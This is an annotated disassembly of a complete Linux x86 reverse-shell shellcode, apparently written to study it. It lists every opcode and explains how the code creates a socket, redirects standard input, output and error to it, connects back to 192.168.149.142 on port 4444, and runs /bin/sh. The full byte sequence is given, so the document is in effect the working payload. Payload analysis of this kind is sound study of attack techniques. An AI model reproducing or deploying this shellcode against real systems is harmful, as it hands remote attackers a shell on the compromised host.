                                                            ; *** Create Socket ***
00000000  31DB              xor ebx,ebx                     ; ebx = 0
00000002  F7E3              mul ebx                         ; to make EAX and EDX = 0
00000004  53                push ebx                        ; push 0
00000005  43                inc ebx                         ; ebx = 1
00000006  53                push ebx                        ; push 1
00000007  6A02              push byte +0x2                  ; push 2
00000009  89E1              mov ecx,esp                     ; ecx = pointer to arguments
0000000B  B066              mov al,0x66                     ; sys call = decimal 102
                                                            ; So:
                                                            ; eax = sys call number = 0x66 = 102 = socketcall(int call, unsigned long *args);
                                                            ; ebx = function call = 1 = socket(int domain, int type, int protocol)
                                                            ; ecx = pointer to args of socket function = { domain = 0 , type = 1 , protocol = 2 }
0000000D  CD80              int 0x80                        ; interrupt
0000000F  93                xchg eax,ebx                    ; return file descriptor for the new socket, or -1 when failure



                                                            ; *** Redirect stdin, stdout, stderr ***
00000010  59                pop ecx                         ; pop top of stack = 2 to ecx
00000011  B03F              mov al,0x3f                     ; sys call = 0x3f = 63
                                                            ; So:
                                                            ; eax = sys call number = 0x3f = 63 = dup2(int oldfd, int newfd);
                                                            ; ebx = oldfd from previous syscall
                                                            ; ecx = newfd = will be 2, 1 then 0 which means stderr, stdout, and stdin resectively
00000013  CD80              int 0x80                        ; interrupt

00000015  49                dec ecx                         ; ecx = ecx - 1
00000016  79F9              jns 0x11                        ; jump back to Line 21



                                                            ; *** connect back to lhost at lport ***
                                                            ; initialize struct sockaddr
00000018  68C0A8958E        push dword 0x8e95a8c0           ; hex representation of address 192.168.149.142
0000001D  680200115C        push dword 0x5c110002           ; [ 5c11 is port 4444 ] and [ 0002 is the value of sin_family which is AF_INET ]
00000022  89E1              mov ecx,esp                     ; pointer to the structre
00000024  B066              mov al,0x66                     ; sys call = decimal 102

00000026  50                push eax                        ; push 102 bytes for the address length
00000027  51                push ecx                        ; push struct sockaddr pointer
00000028  53                push ebx                        ; push socket file descriptor from socket sys call

00000029  B303              mov bl,0x3                      ; ebx = call = 3
0000002B  89E1              mov ecx,esp                     ; ecx = pointer to args
                                                            ; So:
                                                            ; eax = sys call number = 0x66 = 102 = socketcall(int call, unsigned long *args);
                                                            ; ebx = function call = 3 = connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
                                                            ; ecx = pointer to args of connect function = { sockfd , addr structure , addrlen = 102 bytes } 
0000002D  CD80              int 0x80                        ; interrupt


                                                            ; *** run filename that specified by CMD ***
0000002F  52                push edx                        ; push 0
00000030  686E2F7368        push dword 0x68732f6e           ; push hs/n ==>  n/sh  
00000035  682F2F6269        push dword 0x69622f2f           ; push ib// ==>  //bi
0000003A  89E3              mov ebx,esp                     ; ebx = points to address of //bin/sh + null terminator
0000003C  52                push edx                        ; push 0
0000003D  53                push ebx                        ; push pointer of shell name
0000003E  89E1              mov ecx,esp                     ; pointer to argv
00000040  B00B              mov al,0xb                      ; sys call = 0xb = 11
                                                            ; So:
                                                            ; eax = sys call number = 0xb = 11 = execve(const char *pathname, char *const argv[], char *const envp[]);
                                                            ; ebx = pointer to pathname
                                                            ; ecx = pointer to argv 
                                                            ; edx = NULL, no use of evnp
00000042  CD80              int 0x80                        ; interrupt